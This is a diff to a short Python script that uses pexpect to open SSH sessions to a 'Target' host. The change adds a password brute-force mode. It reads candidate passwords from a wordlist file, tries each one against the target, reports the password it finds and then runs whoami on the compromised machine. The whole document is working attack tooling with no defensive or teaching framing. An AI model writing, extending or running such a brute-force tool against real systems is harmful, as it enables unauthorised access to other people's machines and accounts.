@@ -1,6 +1,6 @@
 #!/usr/bin/python3
 
-import pexpect
+import pexpect, subprocess
 
 PROMPT = ["# ", ">>> ", "> ", "\$ "]
 
@@ -23,13 +23,32 @@ def connect(user, host, password):
 			print("[X] Error Connecting... Please Try Again!")
 			return
 	child.sendline(password)
-	child.expect(PROMPT)
+	child.expect(PROMPT, timeout=0.2)
 	return child
 
-def main():
-	host = str(input("Target IPv4: "))
-	user = input("Target SSH Username: ")
+host = str(input("Target IPv4: "))
+user = input("Target SSH Username: ")
+mode = str(input("Do you know the password? [Y/N]: ")).upper()
+
+def login():
 	password = input("Target's SSH Password: ")
 	child = connect(user, host, password)
 	send_command(child, "whoami")
-main()
+
+def attack():
+	f = open("wordlist.txt", "r")
+	for password in f.readlines():
+		password = password.strip("\n")
+		try:
+			child = connect(user, host, password)
+			print(f"[+] Password Found: {password}")
+			send_command(child, "whoami")
+		except:
+			print(f"[x] Password Incorrect: {password}")
+if mode == "Y":
+        login()
+elif mode == "N":
+        attack()
+else:
+        print("Error")
+        exit(0)
